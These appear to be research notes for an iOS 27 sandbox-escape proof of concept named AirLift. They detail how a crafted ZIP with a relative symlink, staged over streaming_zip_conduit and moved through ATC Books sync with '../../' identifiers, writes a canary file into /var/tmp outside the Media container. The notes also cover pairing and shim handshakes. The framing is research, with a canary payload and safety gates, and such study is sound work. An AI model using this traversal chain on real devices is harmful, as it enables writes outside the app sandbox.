# protocol notes

Everything below is grounded in the AirLift PoC, the 3105 IPA, the wloc IPA,
and the idevice crate. Where a step is inferred, it is marked.

## the shape

```
iPhone app
  ├─ pairable host  ← iOS 27 pairs with the app on-device
  ├─ RPPairing record in app container
  ├─ LocalDevVPN utun 10.7.0.0/24
  └─ tunnel to 10.7.0.1:49152 (the device's own remoted)
       ├─ RSD checkin → service map
       ├─ com.apple.afc.shim.remote              Media AFC
       ├─ com.apple.streaming_zip_conduit.shim.remote
       ├─ com.apple.atc.shim.remote              AirTraffic
       ├─ com.apple.mobile.installation_proxy.shim.remote
       └─ com.apple.coredevice.fileservice.data
```

## why loopback works

- 3105 registers `_remotepairing-pairable-host._tcp`, receives a PIN callback,
  and stores the resulting record itself. On iOS 27 the pairing decision is a
  user tap, not a filesystem permission, so the record lands in the app
  container instead of `/var/root/Library/Lockdown/pair_records`.
- LocalDevVPN is a loopback VPN. It hands the app an address on `10.7.0.x`, and
  the device's own `remoted`/RSD listener answers there. wloc drives it with
  `localdevvpn://enable?scheme=...`; 3105 checks the `10.7.0.1` interfaces and
  also tries `10.7.0.2`, `10.7.0.3`, `10.0.0.1`, `172.16.0.1`.
- wloc's strings: `Waiting for pair-setup M1`, `Failed to decrypt pair-setup M5`,
  `device requested pair-verify; only device-initiated pair-setup is supported`,
  `TLS-PSK handshake complete`. Same responder approach, smaller build.

## service names seen in 3105

```
com.apple.afc.shim.remote
com.apple.atc.shim.remote
com.apple.streaming_zip_conduit.shim.remote
com.apple.mobile.installation_proxy.shim.remote
com.apple.syslog_relay.shim.remote
com.apple.coredevice.fileservice.data
com.apple.coredevice.fileservice.control
com.apple.mobile.house_arrest            (MHA-C2 path, out of scope)
com.apple.internal.dt.coredevice.untrusted.tunnelserviceevent
```

## AirLift sequence, from cleanroom/host.m and poc.py

1. Preflight over AFC: source/link/readback names absent, `Books`, `Books/Sync`,
   `Books/Sync/Database` either absent or directories, `Books` files absent.
2. Build the archive:
   - `META-INF/` directory, `META-INF/com.apple.ZipMetadata.plist` with
     `{Version: 2}`, binary plist.
   - directories `a/`, `a/b/`, `a/b/c/`, `var/`, `var/tmp/`.
   - `a/b/c/jump` as a relative symlink, contents `../../../var/tmp`.
   - `payload` regular file with the canary.
   - every entry carries `mode << 16` in `external_attr` and the Apple extra
     field `0x5A53`, `<HHH` = tag, 2, mode. Express ZIP, stored.
3. Stage over `com.apple.streaming_zip_conduit`:
   - `AMDServiceConnectionSendMessage({"MediaSubdir": source})`, binary plist.
   - then the zip bytes.
   - read one plist reply.
   - verify `source/a/b/c/jump` and `source/payload` exist over AFC.
4. Write `Books/Sync/Books.plist`:
   `{Books: [{Persistent ID, Item ID, DSID}]}`, one row per move.
5. Books sync over the ATC service:
   - wait `SyncAllowed`
   - `SendHostInfo`: `Type=iTunes`, `Version=13.7.0.161`, MacOSVersion,
     `SyncHostName=airlift-cleanroom`, `LibraryID=<uuid>`,
     `SyncedDataclasses=[Book]`, `SyncedAssetTypes=[Book]`, `Wakeable=NO`
   - `SendSyncRequest([Book])`
   - wait `ReadyForSync`
   - `SendMetadataSyncFinished({Book: 1})`
   - read `AssetManifest`, require each AssetID with `IsDownload=1`
   - three `SendAssetCompleted(AssetID, "Book", AssetPath)` calls
6. Identifiers, in order:
   - `../../<source>/a/b/c/jump` → `<link>`
   - `../../<source>/payload` → `<link>/<leaf>`
   - relative path of `/var/tmp/<leaf>` → `<readback>`
   The first move puts the symlink in Media where it now points at `/var/tmp`.
   The second follows it and lands the canary outside Media. The third brings it
   back for readback.
7. Finish: read `<readback>` over AFC, compare bytes, remove leaf, link,
   readback, archive tree, Books metadata, and the directories the run created.

## shim handshake, partially inferred

3105 logs `adapter_connect(atc.shim) failed`, `RSDCheckin send failed`,
`RSDCheckin ack: %@`, `RSD handshake: Request=%@ Service=%@ Port=%@`,
`ATC RSD handshake OK (port %u)`. That reads as: connect to the shim port, send
one plist checkin carrying the request, service name, and port, read one plist
ack, then speak the service.

The exact checkin body is not visible in any artifact here. Wave 2 will probe
it with a small set of candidates and log the raw reply instead of assuming:

- `{Request: <uuid>, Service: <name>, Port: <port>}`
- `{UUID: <uuid>, Service: <name>, Port: <port>}`
- `{Request: RSDCheckin, Service: <name>, Port: <port>}`
- empty dictionary

If none is accepted, the fallback is a patched idevice FFI that keeps the shim
stream alive after the handshake and reuses the crate's own framing.

## idevice FFI surface used in wave 1

```
pairable_host_accept(name, model, port, pin_cb, ctx, listening_cb, ctx, connected_cb, ctx, altIRK, &record)
rp_pairing_file_read / write / free
tunnel_create_rppairing(sockaddr, hostname, record, pin_cb, ctx, &adapter, &handshake)
rsd_get_services(handshake, &array) / rsd_free_services
afc_client_connect_rsd(adapter, handshake, &client)
afc_get_device_info(client, &info) / afc_device_info_free
```

Note for wave 2: `adapter_connect` returns `ReadWriteOpaque`, while
`adapter_send`/`adapter_recv` take `AdapterStreamHandle`. The header does not
expose a stream handle for a shim port, and `rsd_handshake_new` consumes the
stream. If the probe confirms the checkin is required, the clean fix is a small
patch to `ffi/src/tunnel_provider.rs` adding `adapter_stream_connect` plus raw
send/recv on the returned handle, then rebuilding the static library from
`jkcoxson/idevice`.

## safety gates for wave 2

- refuse to stage unless the device is iOS 27 and the three shims are present.
- refuse to stage when any AirLift leftover exists (`cl-src-*`, `cl-link-*`,
  `cl-read-*`, Books staging).
- one canary only, random 20 hex chars, never overwrite.
- verify every byte before removing anything.
- leave unrelated Books content alone; name a recovery path if cleanup is partial.
